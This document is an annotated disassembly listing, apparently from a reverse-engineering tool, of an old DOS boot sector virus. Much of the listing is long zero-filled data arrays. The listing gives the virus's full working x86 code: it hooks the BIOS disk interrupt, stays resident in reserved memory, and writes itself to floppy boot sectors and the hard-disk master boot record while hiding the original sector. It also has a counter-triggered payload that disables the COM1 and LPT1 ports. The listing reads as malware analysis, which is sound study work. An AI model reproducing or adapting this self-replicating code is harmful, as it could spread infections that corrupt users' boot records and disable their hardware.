                                     INT13H_OFS:                   ;XREF[2]:     0000:7c97(*),0000:7cb0(*)
IVT/Int 13h:0000:004c                    dw          ??
                                     INT13H_SEG:                   ;XREF[2]:     0000:7c9d(*),0000:7cb6(*)
IVT/Int 13h:0000:004e                    dw          ??
                                     COM1:                         ;XREF[1]:     9fc0:015b(*)
COM base I/O port addr...                dw          ??
COM base I/O port addr...                dw          ??
COM base I/O port addr...                dw          ??
COM base I/O port addr...                dw          ??
                                     LPT1:                         ;XREF[1]:     9fc0:0156(*)
LPT base I/O port addr...                dw          ??
LPT base I/O port addr...                dw          ??
LPT base I/O port addr...                dw          ??
LPT base I/O port addr...                dw          ??
                                     CONVENTIONAL_MEMORY_SIZE:     ;XREF[2]:     0000:7ca3(*),0000:7ca7(*)
BIOS: Conventional mem...                dw          ??                                                          ;In KiB
                                     FLOPPY_MOTOR_STATUS:          ;XREF[1]:     9fc0:001f(R)
BIOS: Floppy motor sta...                db          ??
                                     BOOT_START:                   ;XREF[6,1]:   0000:7c94(*),0000:7cbc(*),0000:7cc2(R),0000:7cc2(R),
                                                                   ;             9fc0:00d5(*),9fc0:00e5(j),0000:7cc2(R)
File body:0000:7c00      e98b00          JMP         INSTALL_VIRUS
                                     VIRUS_FILE_FRAGMENT:
File body:0000:7c03      000000000...    db[139]
   |_File body:0000:7c03      [0]             db          0h
   |_File body:0000:7c04      [1]             db          0h
   |_File body:0000:7c05      [2]             db          0h
   |_File body:0000:7c06      [3]             db          0h
   |_File body:0000:7c07      [4]             db          0h
   |_File body:0000:7c08      [5]             db          0h
   |_File body:0000:7c09      [6]             db          0h
   |_File body:0000:7c0a      [7]             db          0h
   |_File body:0000:7c0b      [8]             db          0h
   |_File body:0000:7c0c      [9]             db          0h
   |_File body:0000:7c0d      [10]            db          0h
   |_File body:0000:7c0e      [11]            db          0h
   |_File body:0000:7c0f      [12]            db          0h
   |_File body:0000:7c10      [13]            db          0h
   |_File body:0000:7c11      [14]            db          0h
   |_File body:0000:7c12      [15]            db          0h
   |_File body:0000:7c13      [16]            db          0h
   |_File body:0000:7c14      [17]            db          0h
   |_File body:0000:7c15      [18]            db          0h
   |_File body:0000:7c16      [19]            db          0h
   |_File body:0000:7c17      [20]            db          0h
   |_File body:0000:7c18      [21]            db          0h
   |_File body:0000:7c19      [22]            db          0h
   |_File body:0000:7c1a      [23]            db          0h
   |_File body:0000:7c1b      [24]            db          0h
   |_File body:0000:7c1c      [25]            db          0h
   |_File body:0000:7c1d      [26]            db          0h
   |_File body:0000:7c1e      [27]            db          0h
   |_File body:0000:7c1f      [28]            db          0h
   |_File body:0000:7c20      [29]            db          0h
   |_File body:0000:7c21      [30]            db          0h
   |_File body:0000:7c22      [31]            db          0h
   |_File body:0000:7c23      [32]            db          0h
   |_File body:0000:7c24      [33]            db          0h
   |_File body:0000:7c25      [34]            db          0h
   |_File body:0000:7c26      [35]            db          0h
   |_File body:0000:7c27      [36]            db          0h
   |_File body:0000:7c28      [37]            db          0h
   |_File body:0000:7c29      [38]            db          0h
   |_File body:0000:7c2a      [39]            db          0h
   |_File body:0000:7c2b      [40]            db          0h
   |_File body:0000:7c2c      [41]            db          0h
   |_File body:0000:7c2d      [42]            db          0h
   |_File body:0000:7c2e      [43]            db          0h
   |_File body:0000:7c2f      [44]            db          0h
   |_File body:0000:7c30      [45]            db          0h
   |_File body:0000:7c31      [46]            db          0h
   |_File body:0000:7c32      [47]            db          0h
   |_File body:0000:7c33      [48]            db          0h
   |_File body:0000:7c34      [49]            db          0h
   |_File body:0000:7c35      [50]            db          0h
   |_File body:0000:7c36      [51]            db          0h
   |_File body:0000:7c37      [52]            db          0h
   |_File body:0000:7c38      [53]            db          0h
   |_File body:0000:7c39      [54]            db          0h
   |_File body:0000:7c3a      [55]            db          0h
   |_File body:0000:7c3b      [56]            db          0h
   |_File body:0000:7c3c      [57]            db          0h
   |_File body:0000:7c3d      [58]            db          0h
   |_File body:0000:7c3e      [59]            db          0h
   |_File body:0000:7c3f      [60]            db          0h
   |_File body:0000:7c40      [61]            db          0h
   |_File body:0000:7c41      [62]            db          0h
   |_File body:0000:7c42      [63]            db          0h
   |_File body:0000:7c43      [64]            db          0h
   |_File body:0000:7c44      [65]            db          0h
   |_File body:0000:7c45      [66]            db          0h
   |_File body:0000:7c46      [67]            db          0h
   |_File body:0000:7c47      [68]            db          0h
   |_File body:0000:7c48      [69]            db          0h
   |_File body:0000:7c49      [70]            db          0h
   |_File body:0000:7c4a      [71]            db          0h
   |_File body:0000:7c4b      [72]            db          0h
   |_File body:0000:7c4c      [73]            db          0h
   |_File body:0000:7c4d      [74]            db          0h
   |_File body:0000:7c4e      [75]            db          0h
   |_File body:0000:7c4f      [76]            db          0h
   |_File body:0000:7c50      [77]            db          0h
   |_File body:0000:7c51      [78]            db          0h
   |_File body:0000:7c52      [79]            db          0h
   |_File body:0000:7c53      [80]            db          0h
   |_File body:0000:7c54      [81]            db          0h
   |_File body:0000:7c55      [82]            db          0h
   |_File body:0000:7c56      [83]            db          0h
   |_File body:0000:7c57      [84]            db          0h
   |_File body:0000:7c58      [85]            db          0h
   |_File body:0000:7c59      [86]            db          0h
   |_File body:0000:7c5a      [87]            db          0h
   |_File body:0000:7c5b      [88]            db          0h
   |_File body:0000:7c5c      [89]            db          0h
   |_File body:0000:7c5d      [90]            db          0h
   |_File body:0000:7c5e      [91]            db          0h
   |_File body:0000:7c5f      [92]            db          0h
   |_File body:0000:7c60      [93]            db          0h
   |_File body:0000:7c61      [94]            db          0h
   |_File body:0000:7c62      [95]            db          0h
   |_File body:0000:7c63      [96]            db          0h
   |_File body:0000:7c64      [97]            db          0h
   |_File body:0000:7c65      [98]            db          0h
   |_File body:0000:7c66      [99]            db          0h
   |_File body:0000:7c67      [100]           db          0h
   |_File body:0000:7c68      [101]           db          0h
   |_File body:0000:7c69      [102]           db          0h
   |_File body:0000:7c6a      [103]           db          0h
   |_File body:0000:7c6b      [104]           db          0h
   |_File body:0000:7c6c      [105]           db          0h
   |_File body:0000:7c6d      [106]           db          0h
   |_File body:0000:7c6e      [107]           db          0h
   |_File body:0000:7c6f      [108]           db          0h
   |_File body:0000:7c70      [109]           db          0h
   |_File body:0000:7c71      [110]           db          0h
   |_File body:0000:7c72      [111]           db          0h
   |_File body:0000:7c73      [112]           db          0h
   |_File body:0000:7c74      [113]           db          0h
   |_File body:0000:7c75      [114]           db          0h
   |_File body:0000:7c76      [115]           db          0h
   |_File body:0000:7c77      [116]           db          0h
   |_File body:0000:7c78      [117]           db          0h
   |_File body:0000:7c79      [118]           db          0h
   |_File body:0000:7c7a      [119]           db          0h
   |_File body:0000:7c7b      [120]           db          0h
   |_File body:0000:7c7c      [121]           db          0h
   |_File body:0000:7c7d      [122]           db          0h
   |_File body:0000:7c7e      [123]           db          0h
   |_File body:0000:7c7f      [124]           db          0h
   |_File body:0000:7c80      [125]           db          0h
   |_File body:0000:7c81      [126]           db          0h
   |_File body:0000:7c82      [127]           db          0h
   |_File body:0000:7c83      [128]           db          0h
   |_File body:0000:7c84      [129]           db          0h
   |_File body:0000:7c85      [130]           db          0h
   |_File body:0000:7c86      [131]           db          0h
   |_File body:0000:7c87      [132]           db          0h
   |_File body:0000:7c88      [133]           db          0h
   |_File body:0000:7c89      [134]           db          0h
   |_File body:0000:7c8a      [135]           db          0h
   |_File body:0000:7c8b      [136]           db          0h
   |_File body:0000:7c8c      [137]           db          0h
   |_File body:0000:7c8d      [138]           db          0h
                                     INSTALL_VIRUS:                ;XREF[1]:     0000:7c00(c)
File body:0000:7c8e      31c0            XOR         AX,AX
File body:0000:7c90      8ed8            MOV         DS,AX
File body:0000:7c92      8ed0            MOV         SS,AX
File body:0000:7c94      bc007c          MOV         SP,BOOT_START
File body:0000:7c97      a14c00          MOV         AX,[IVT/Int 13h:INT13H_OFS]                                 ;= ??
File body:0000:7c9a      a36c7c          MOV         [0x7c6c]=>Resident body:ORIG_INT13H_OFS,AX
File body:0000:7c9d      a14e00          MOV         AX,[IVT/Int 13h:INT13H_SEG]                                 ;= ??
File body:0000:7ca0      a36e7c          MOV         [0x7c6e]=>Resident body:ORIG_INT13H_SEG,AX
File body:0000:7ca3      a11304          MOV         AX,[BIOS: Conventional memory size:CONVENTIONAL_MEMORY_SIZE];= ??
File body:0000:7ca6      48              DEC         AX                                                          ;Reserve 1 KiB for the virus
File body:0000:7ca7      a31304          MOV         [BIOS: Conventional memory size:CONVENTIONAL_MEMORY_SIZE],AX;= ??
File body:0000:7caa      b106            MOV         CL,0x6                                                      ;Convert to segments
File body:0000:7cac      d3e0            SHL         AX,CL
File body:0000:7cae      8ec0            MOV         ES,AX
File body:0000:7cb0      c7064c000b00    MOV         word ptr [IVT/Int 13h:INT1...,Resident body:INT13H_HANDLER  ;= ??
File body:0000:7cb6      a34e00          MOV         [IVT/Int 13h:INT13H_SEG],AX                                 ;= ??
                                     COPY_VIRUS_TO_MEMORY:
File body:0000:7cb9      b90002          MOV         CX,BOOT_SECTOR_SIZE
File body:0000:7cbc      be007c          MOV         SI,BOOT_START
File body:0000:7cbf      31ff            XOR         DI,DI
File body:0000:7cc1      fc              CLD
                                                                   ; FWD[2]:     0000:7c00(R),0000:7c01(R)
File body:0000:7cc2      f3a4            MOVSB.REP   ES:DI,SI=>BOOT_START
File body:0000:7cc4      50              PUSH        AX
File body:0000:7cc5      b8ca00          MOV         AX,Resident body:CONTINUE_BOOT
File body:0000:7cc8      50              PUSH        AX
File body:0000:7cc9      cb              RETF
                                     VIRUS_RESIDENT_FRAGMENT:
Resident body:9fc0:0000  000000          db[3]
   |_Resident body:9fc0:0000  [0]             db          0h
   |_Resident body:9fc0:0001  [1]             db          0h
   |_Resident body:9fc0:0002  [2]             db          0h
                                     ORIG_OEM_ID:                  ;XREF[1]:     9fc0:007a(*)
Resident body:9fc0:0003  504320546...    ds          "PC Tools"
                                     INT13H_HANDLER:               ;XREF[1]:     0000:7cb0(*)
Resident body:9fc0:000b  f6c402          TEST        AH,0x2
Resident body:9fc0:000e  745b            JZ          RETURN_ORIG_INT13H
Resident body:9fc0:0010  f6c280          TEST        DL,0x80
Resident body:9fc0:0013  7556            JNZ         RETURN_ORIG_INT13H
Resident body:9fc0:0015  50              PUSH        AX
Resident body:9fc0:0016  1e              PUSH        DS
Resident body:9fc0:0017  31c0            XOR         AX,AX
Resident body:9fc0:0019  8ed8            MOV         DS,AX
                                     ;************************************************************************************************************************************************************
                                     ;*  0x00 : first floppy (A:)                                                                                                                                *
                                     ;*  0x01 : second floppy (B:)                                                                                                                               *
                                     ;*  0x80 : first hard disk                                                                                                                                  *
                                     ;*  0x81 : second hard disk                                                                                                                                 *
                                     ;************************************************************************************************************************************************************
Resident body:9fc0:001b  88d0            MOV         AL,DL
Resident body:9fc0:001d  fec0            INC         AL                                                          ;Convert to motor status bit (bitmask)
Resident body:9fc0:001f  84063f04        TEST        byte ptr [BIOS: Floppy motor status:FLOPPY_MOTOR_STATUS],AL ;Is the floppy running?
Resident body:9fc0:0023  7544            JNZ         POP4_AND_RETURN                                             ;Jump if yes
Resident body:9fc0:0025  53              PUSH        BX
Resident body:9fc0:0026  51              PUSH        CX
Resident body:9fc0:0027  52              PUSH        DX
Resident body:9fc0:0028  06              PUSH        ES
Resident body:9fc0:0029  57              PUSH        DI
Resident body:9fc0:002a  56              PUSH        SI
Resident body:9fc0:002b  b80102          MOV         AX,READ_SECTOR
Resident body:9fc0:002e  0e              PUSH        CS
Resident body:9fc0:002f  07              POP         ES
Resident body:9fc0:0030  bb0002          MOV         BX,HDD_MBR_BUFFER
Resident body:9fc0:0033  b90100          MOV         CX,0x1                                                      ;Cylinder 0, sector 1
Resident body:9fc0:0036  b600            MOV         DH,0x0                                                      ;Head
Resident body:9fc0:0038  e83500          CALL        CALL_ORIG_INT_13H
Resident body:9fc0:003b  7226            JC          POP16_AND_RETURN
Resident body:9fc0:003d  0e              PUSH        CS
Resident body:9fc0:003e  1f              POP         DS
Resident body:9fc0:003f  a18902          MOV         AX,[INFECTION_MARKER_DISK]
Resident body:9fc0:0042  3b068900        CMP         AX,word ptr [INFECTION_SIGNATURE]
Resident body:9fc0:0046  741b            JZ          POP16_AND_RETURN
Resident body:9fc0:0048  b80103          MOV         AX,WRITE_SECTOR
Resident body:9fc0:004b  b90827          MOV         CX,ORIG_BS_CHS                                              ;Cyling 39, sector 8
Resident body:9fc0:004e  b601            MOV         DH,0x1                                                      ;Head 1
Resident body:9fc0:0050  e81d00          CALL        CALL_ORIG_INT_13H
Resident body:9fc0:0053  720e            JC          POP16_AND_RETURN
Resident body:9fc0:0055  e81f00          CALL        COPY_ORIG_BOOT_DATA
Resident body:9fc0:0058  b80103          MOV         AX,0x301
Resident body:9fc0:005b  31db            XOR         BX,BX
Resident body:9fc0:005d  41              INC         CX
Resident body:9fc0:005e  b600            MOV         DH,0x0
Resident body:9fc0:0060  e80d00          CALL        CALL_ORIG_INT_13H
                                     POP16_AND_RETURN:             ;XREF[3]:     9fc0:003b(j),9fc0:0046(j),9fc0:0053(j)
Resident body:9fc0:0063  5e              POP         SI
Resident body:9fc0:0064  5f              POP         DI
Resident body:9fc0:0065  07              POP         ES
Resident body:9fc0:0066  5a              POP         DX
Resident body:9fc0:0067  59              POP         CX
Resident body:9fc0:0068  5b              POP         BX
                                     POP4_AND_RETURN:              ;XREF[1]:     9fc0:0023(j)
Resident body:9fc0:0069  1f              POP         DS
Resident body:9fc0:006a  58              POP         AX
                                     RETURN_ORIG_INT13H:           ;XREF[5,3]:   0000:7c9a(*),0000:7ca0(*),9fc0:000e(j),9fc0:0013(j),
                                                                   ;             9fc0:0071(*),0000:7c9a(*),0000:7ca0(*),9fc0:0071(*)
Resident body:9fc0:006b  eaeba100f0      JMPF        f000:a1eb
                                     CALL_ORIG_INT_13H:            ;XREF[3]:     9fc0:0038(c),9fc0:0050(c),9fc0:0060(c)
Resident body:9fc0:0070  9c              PUSHF
Resident body:9fc0:0071  2eff1e6c00      CALLF       [ORIG_INT13H_OFS]
Resident body:9fc0:0076  c3              RET
                                     COPY_ORIG_BOOT_DATA:          ;XREF[2]:     9fc0:0055(c),9fc0:010f(c)
Resident body:9fc0:0077  be0302          MOV         SI,HDD_MBR_BUFFER[3]                                        ;The first 3 bytes are a JMP (they're followed by non-code)
Resident body:9fc0:007a  bf0300          MOV         DI,ORIG_OEM_ID                                              ;= "PC Tools"
Resident body:9fc0:007d  b90800          MOV         CX,OEM_ID_SIZE
Resident body:9fc0:0080  fc              CLD
Resident body:9fc0:0081  f3a4            MOVSB.REP   ES:DI,SI
Resident body:9fc0:0083  be7003          MOV         SI,HDD_MBR_BUFFER[368]
Resident body:9fc0:0086  bf7001          MOV         DI,ORIG_MBR_LAST_0x90_BYTES[3]
                                     INFECTION_SIGNATURE:          ;XREF[2]:     9fc0:0042(*),9fc0:0109(*)
Resident body:9fc0:0089  b190            MOV         CL,0x90
Resident body:9fc0:008b  f3a4            MOVSB.REP   ES:DI,SI
Resident body:9fc0:008d  c3              RET
                                     VIRUS_RESIDENT_FRAGMENT:
Resident body:9fc0:008e  000000000...    db[60]
   |_Resident body:9fc0:008e  [0]             db          0h
   |_Resident body:9fc0:008f  [1]             db          0h
   |_Resident body:9fc0:0090  [2]             db          0h
   |_Resident body:9fc0:0091  [3]             db          0h
   |_Resident body:9fc0:0092  [4]             db          0h
   |_Resident body:9fc0:0093  [5]             db          0h
   |_Resident body:9fc0:0094  [6]             db          0h
   |_Resident body:9fc0:0095  [7]             db          0h
   |_Resident body:9fc0:0096  [8]             db          0h
   |_Resident body:9fc0:0097  [9]             db          0h
   |_Resident body:9fc0:0098  [10]            db          0h
   |_Resident body:9fc0:0099  [11]            db          0h
   |_Resident body:9fc0:009a  [12]            db          0h
   |_Resident body:9fc0:009b  [13]            db          0h
   |_Resident body:9fc0:009c  [14]            db          0h
   |_Resident body:9fc0:009d  [15]            db          0h
   |_Resident body:9fc0:009e  [16]            db          0h
   |_Resident body:9fc0:009f  [17]            db          0h
   |_Resident body:9fc0:00a0  [18]            db          0h
   |_Resident body:9fc0:00a1  [19]            db          0h
   |_Resident body:9fc0:00a2  [20]            db          0h
   |_Resident body:9fc0:00a3  [21]            db          0h
   |_Resident body:9fc0:00a4  [22]            db          0h
   |_Resident body:9fc0:00a5  [23]            db          0h
   |_Resident body:9fc0:00a6  [24]            db          0h
   |_Resident body:9fc0:00a7  [25]            db          0h
   |_Resident body:9fc0:00a8  [26]            db          0h
   |_Resident body:9fc0:00a9  [27]            db          0h
   |_Resident body:9fc0:00aa  [28]            db          0h
   |_Resident body:9fc0:00ab  [29]            db          0h
   |_Resident body:9fc0:00ac  [30]            db          0h
   |_Resident body:9fc0:00ad  [31]            db          0h
   |_Resident body:9fc0:00ae  [32]            db          0h
   |_Resident body:9fc0:00af  [33]            db          0h
   |_Resident body:9fc0:00b0  [34]            db          0h
   |_Resident body:9fc0:00b1  [35]            db          0h
   |_Resident body:9fc0:00b2  [36]            db          0h
   |_Resident body:9fc0:00b3  [37]            db          0h
   |_Resident body:9fc0:00b4  [38]            db          0h
   |_Resident body:9fc0:00b5  [39]            db          0h
   |_Resident body:9fc0:00b6  [40]            db          0h
   |_Resident body:9fc0:00b7  [41]            db          0h
   |_Resident body:9fc0:00b8  [42]            db          0h
   |_Resident body:9fc0:00b9  [43]            db          0h
   |_Resident body:9fc0:00ba  [44]            db          0h
   |_Resident body:9fc0:00bb  [45]            db          0h
   |_Resident body:9fc0:00bc  [46]            db          0h
   |_Resident body:9fc0:00bd  [47]            db          0h
   |_Resident body:9fc0:00be  [48]            db          0h
   |_Resident body:9fc0:00bf  [49]            db          0h
   |_Resident body:9fc0:00c0  [50]            db          0h
   |_Resident body:9fc0:00c1  [51]            db          0h
   |_Resident body:9fc0:00c2  [52]            db          0h
   |_Resident body:9fc0:00c3  [53]            db          0h
   |_Resident body:9fc0:00c4  [54]            db          0h
   |_Resident body:9fc0:00c5  [55]            db          0h
   |_Resident body:9fc0:00c6  [56]            db          0h
   |_Resident body:9fc0:00c7  [57]            db          0h
   |_Resident body:9fc0:00c8  [58]            db          0h
   |_Resident body:9fc0:00c9  [59]            db          0h
                                     CONTINUE_BOOT:                ;XREF[1]:     0000:7cc5(*)
Resident body:9fc0:00ca  31c0            XOR         AX,AX                                                       ;Reset floppy disk controller
Resident body:9fc0:00cc  cd13            INT         0x13
Resident body:9fc0:00ce  31c0            XOR         AX,AX
Resident body:9fc0:00d0  8ec0            MOV         ES,AX
Resident body:9fc0:00d2  b80102          MOV         AX,READ_SECTOR
Resident body:9fc0:00d5  bb007c          MOV         BX,File body:BOOT_START
Resident body:9fc0:00d8  0e              PUSH        CS
Resident body:9fc0:00d9  1f              POP         DS
Resident body:9fc0:00da  e83f00          CALL        FIND_ACTIVE_PARTITION
Resident body:9fc0:00dd  f6c1ff          TEST        CL,0xff                                                     ;Any active partitions found?…
Resident body:9fc0:00e0  7408            JZ          FLOPPY_BOOT_INFECT_HDD                                      ;… no; booted from a floppy
Resident body:9fc0:00e2  e85100          CALL        PAYLOAD_TEST
                                     JMP_BOOT_START:               ;XREF[4]:     9fc0:00f2(j),9fc0:0104(j),9fc0:010d(j),9fc0:011a(j)
Resident body:9fc0:00e5  ea007c0000      JMPF        File body:BOOT_START
                                     FLOPPY_BOOT_INFECT_HDD:       ;XREF[1]:     9fc0:00e0(j)
Resident body:9fc0:00ea  b90827          MOV         CX,ORIG_BS_CHS
Resident body:9fc0:00ed  ba0001          MOV         DX,ORIG_BS_HEAD_FLOPPY
Resident body:9fc0:00f0  cd13            INT         0x13                                                        ;Put the original BS back in place (ES:BX=7c00)
Resident body:9fc0:00f2  72f1            JC          JMP_BOOT_START
Resident body:9fc0:00f4  0e              PUSH        CS                                                          ;Copy MBR
Resident body:9fc0:00f5  07              POP         ES
Resident body:9fc0:00f6  b80102          MOV         AX,READ_SECTOR
Resident body:9fc0:00f9  bb0002          MOV         BX,HDD_MBR_BUFFER
Resident body:9fc0:00fc  b90100          MOV         CX,0x1                                                      ;Cylinder 0, sector 1
Resident body:9fc0:00ff  ba8000          MOV         DX,HEAD_0_HDD
Resident body:9fc0:0102  cd13            INT         0x13
Resident body:9fc0:0104  72df            JC          JMP_BOOT_START
Resident body:9fc0:0106  a18902          MOV         AX,[INFECTION_MARKER_DISK]
Resident body:9fc0:0109  39068900        CMP         word ptr [INFECTION_SIGNATURE],AX
Resident body:9fc0:010d  74d6            JZ          JMP_BOOT_START
Resident body:9fc0:010f  e865ff          CALL        COPY_ORIG_BOOT_DATA
Resident body:9fc0:0112  b80103          MOV         AX,WRITE_SECTOR
Resident body:9fc0:0115  31db            XOR         BX,BX
Resident body:9fc0:0117  41              INC         CX                                                          ;Cylinder 0, sector 1
Resident body:9fc0:0118  cd13            INT         0x13
Resident body:9fc0:011a  ebc9            JMP         JMP_BOOT_START
                                     ;************************************************************************************************************************************************************
                                     ;*                                                                Retuns CHS params in CX/DX                                                                *
                                     ;************************************************************************************************************************************************************
                                     FIND_ACTIVE_PARTITION:        ;XREF[1]:     9fc0:00da(c)
Resident body:9fc0:011c  bebe01          MOV         SI,HDD_PARTITION_TABLE
Resident body:9fc0:011f  b90400          MOV         CX,0x4
                                     SEARCH_ACTIVE_PARTITION:      ;XREF[1]:     9fc0:012a(j)
Resident body:9fc0:0122  803c80          CMP         byte ptr [SI],ACTIVE
Resident body:9fc0:0125  7407            JZ          READ_ACTIVE_PARTITION_VBR
Resident body:9fc0:0127  83c610          ADD         SI,MBR_PARTITION_ENTRY_SIZE
Resident body:9fc0:012a  e2f6            LOOP        SEARCH_ACTIVE_PARTITION
Resident body:9fc0:012c  eb07            JMP         EXIT_SEARCH
                                     READ_ACTIVE_PARTITION_VBR:    ;XREF[1]:     9fc0:0125(j)
Resident body:9fc0:012e  8b4c02          MOV         CX,word ptr [SI + 0x2]
Resident body:9fc0:0131  8b14            MOV         DX,word ptr [SI]
Resident body:9fc0:0133  cd13            INT         0x13
                                     EXIT_SEARCH:                  ;XREF[1]:     9fc0:012c(j)
Resident body:9fc0:0135  c3              RET
                                     PAYLOAD_TEST:                 ;XREF[1]:     9fc0:00e2(c)
Resident body:9fc0:0136  f6066f01e0      TEST        byte ptr [PAYLOAD_COUNTER],0xe0                             ;Top 3 bits set?
Resident body:9fc0:013b  7515            JNZ         RUN_PAYLOAD
Resident body:9fc0:013d  80066f0101      ADD         byte ptr [PAYLOAD_COUNTER],0x1
Resident body:9fc0:0142  b80103          MOV         AX,WRITE_SECTOR
Resident body:9fc0:0145  0e              PUSH        CS
Resident body:9fc0:0146  07              POP         ES
Resident body:9fc0:0147  31db            XOR         BX,BX
Resident body:9fc0:0149  b90100          MOV         CX,0x1                                                      ;Cylinder 0, Sector 1
Resident body:9fc0:014c  b600            MOV         DH,0x0                                                      ;Head 0
Resident body:9fc0:014e  cd13            INT         0x13                                                        ;Rewrite the virus to the MBR
Resident body:9fc0:0150  eb0e            JMP         PAYLOAD_EXIT
                                     RUN_PAYLOAD:                  ;XREF[1]:     9fc0:013b(j)
Resident body:9fc0:0152  31c0            XOR         AX,AX
Resident body:9fc0:0154  8ed8            MOV         DS,AX
                                     DISABLE_PORTS:                ;XREF[1,1]:   9fc0:0167(*),9fc0:0167(*)
Resident body:9fc0:0156  c606080400      MOV         byte ptr [LPT base I/O port addresses:LPT1],0x0             ;Disable LPT1 (sets invalid address)
Resident body:9fc0:015b  c606000400      MOV         byte ptr [COM base I/O port addresses:COM1],0x0             ;Disable COM1
                                     PAYLOAD_EXIT:                 ;XREF[1]:     9fc0:0150(j)
Resident body:9fc0:0160  0e              PUSH        CS
Resident body:9fc0:0161  1f              POP         DS
Resident body:9fc0:0162  c6066f0100      MOV         byte ptr [PAYLOAD_COUNTER],0x0
Resident body:9fc0:0167  c6065a0100      MOV         byte ptr [DISABLE_PORTS+4],0x0                              ;No-op; seems slop
Resident body:9fc0:016c  c3              RET
                                     ORIG_MBR_LAST_0x90_BYTES:     ;XREF[5,5]:   9fc0:0086(*),9fc0:011c(*),9fc0:0136(*),9fc0:013d(*),
                                                                   ;             9fc0:0162(*),9fc0:0086(*),9fc0:011c(*),9fc0:0136(*),
                                                                   ;             9fc0:013d(*),9fc0:0162(*)
Resident body:9fc0:016d  000000000...    ??[147]
   |_Resident body:9fc0:016d  [0]             ??          00h
   |_Resident body:9fc0:016e  [1]             ??          00h
   |_Resident body:9fc0:016f  [2]             ??          00h
   |_Resident body:9fc0:0170  [3]             ??          00h
   |_Resident body:9fc0:0171  [4]             ??          00h
   |_Resident body:9fc0:0172  [5]             ??          00h
   |_Resident body:9fc0:0173  [6]             ??          00h
   |_Resident body:9fc0:0174  [7]             ??          00h
   |_Resident body:9fc0:0175  [8]             ??          00h
   |_Resident body:9fc0:0176  [9]             ??          00h
   |_Resident body:9fc0:0177  [10]            ??          00h
   |_Resident body:9fc0:0178  [11]            ??          00h
   |_Resident body:9fc0:0179  [12]            ??          00h
   |_Resident body:9fc0:017a  [13]            ??          00h
   |_Resident body:9fc0:017b  [14]            ??          00h
   |_Resident body:9fc0:017c  [15]            ??          00h
   |_Resident body:9fc0:017d  [16]            ??          00h
   |_Resident body:9fc0:017e  [17]            ??          00h
   |_Resident body:9fc0:017f  [18]            ??          00h
   |_Resident body:9fc0:0180  [19]            ??          00h
   |_Resident body:9fc0:0181  [20]            ??          00h
   |_Resident body:9fc0:0182  [21]            ??          00h
   |_Resident body:9fc0:0183  [22]            ??          00h
   |_Resident body:9fc0:0184  [23]            ??          00h
   |_Resident body:9fc0:0185  [24]            ??          00h
   |_Resident body:9fc0:0186  [25]            ??          00h
   |_Resident body:9fc0:0187  [26]            ??          00h
   |_Resident body:9fc0:0188  [27]            ??          00h
   |_Resident body:9fc0:0189  [28]            ??          00h
   |_Resident body:9fc0:018a  [29]            ??          00h
   |_Resident body:9fc0:018b  [30]            ??          00h
   |_Resident body:9fc0:018c  [31]            ??          00h
   |_Resident body:9fc0:018d  [32]            ??          00h
   |_Resident body:9fc0:018e  [33]            ??          00h
   |_Resident body:9fc0:018f  [34]            ??          00h
   |_Resident body:9fc0:0190  [35]            ??          00h
   |_Resident body:9fc0:0191  [36]            ??          00h
   |_Resident body:9fc0:0192  [37]            ??          00h
   |_Resident body:9fc0:0193  [38]            ??          00h
   |_Resident body:9fc0:0194  [39]            ??          00h
   |_Resident body:9fc0:0195  [40]            ??          00h
   |_Resident body:9fc0:0196  [41]            ??          00h
   |_Resident body:9fc0:0197  [42]            ??          00h
   |_Resident body:9fc0:0198  [43]            ??          00h
   |_Resident body:9fc0:0199  [44]            ??          00h
   |_Resident body:9fc0:019a  [45]            ??          00h
   |_Resident body:9fc0:019b  [46]            ??          00h
   |_Resident body:9fc0:019c  [47]            ??          00h
   |_Resident body:9fc0:019d  [48]            ??          00h
   |_Resident body:9fc0:019e  [49]            ??          00h
   |_Resident body:9fc0:019f  [50]            ??          00h
   |_Resident body:9fc0:01a0  [51]            ??          00h
   |_Resident body:9fc0:01a1  [52]            ??          00h
   |_Resident body:9fc0:01a2  [53]            ??          00h
   |_Resident body:9fc0:01a3  [54]            ??          00h
   |_Resident body:9fc0:01a4  [55]            ??          00h
   |_Resident body:9fc0:01a5  [56]            ??          00h
   |_Resident body:9fc0:01a6  [57]            ??          00h
   |_Resident body:9fc0:01a7  [58]            ??          00h
   |_Resident body:9fc0:01a8  [59]            ??          00h
   |_Resident body:9fc0:01a9  [60]            ??          00h
   |_Resident body:9fc0:01aa  [61]            ??          00h
   |_Resident body:9fc0:01ab  [62]            ??          00h
   |_Resident body:9fc0:01ac  [63]            ??          00h
   |_Resident body:9fc0:01ad  [64]            ??          00h
   |_Resident body:9fc0:01ae  [65]            ??          00h
   |_Resident body:9fc0:01af  [66]            ??          00h
   |_Resident body:9fc0:01b0  [67]            ??          00h
   |_Resident body:9fc0:01b1  [68]            ??          00h
   |_Resident body:9fc0:01b2  [69]            ??          00h
   |_Resident body:9fc0:01b3  [70]            ??          00h
   |_Resident body:9fc0:01b4  [71]            ??          00h
   |_Resident body:9fc0:01b5  [72]            ??          00h
   |_Resident body:9fc0:01b6  [73]            ??          00h
   |_Resident body:9fc0:01b7  [74]            ??          00h
   |_Resident body:9fc0:01b8  [75]            ??          00h
   |_Resident body:9fc0:01b9  [76]            ??          00h
   |_Resident body:9fc0:01ba  [77]            ??          00h
   |_Resident body:9fc0:01bb  [78]            ??          00h
   |_Resident body:9fc0:01bc  [79]            ??          00h
   |_Resident body:9fc0:01bd  [80]            ??          00h
   |_Resident body:9fc0:01be  [81]            ??          00h
   |_Resident body:9fc0:01bf  [82]            ??          00h
   |_Resident body:9fc0:01c0  [83]            ??          00h
   |_Resident body:9fc0:01c1  [84]            ??          00h
   |_Resident body:9fc0:01c2  [85]            ??          00h
   |_Resident body:9fc0:01c3  [86]            ??          00h
   |_Resident body:9fc0:01c4  [87]            ??          00h
   |_Resident body:9fc0:01c5  [88]            ??          00h
   |_Resident body:9fc0:01c6  [89]            ??          00h
   |_Resident body:9fc0:01c7  [90]            ??          00h
   |_Resident body:9fc0:01c8  [91]            ??          00h
   |_Resident body:9fc0:01c9  [92]            ??          00h
   |_Resident body:9fc0:01ca  [93]            ??          00h
   |_Resident body:9fc0:01cb  [94]            ??          00h
   |_Resident body:9fc0:01cc  [95]            ??          00h
   |_Resident body:9fc0:01cd  [96]            ??          00h
   |_Resident body:9fc0:01ce  [97]            ??          00h
   |_Resident body:9fc0:01cf  [98]            ??          00h
   |_Resident body:9fc0:01d0  [99]            ??          00h
   |_Resident body:9fc0:01d1  [100]           ??          00h
   |_Resident body:9fc0:01d2  [101]           ??          00h
   |_Resident body:9fc0:01d3  [102]           ??          00h
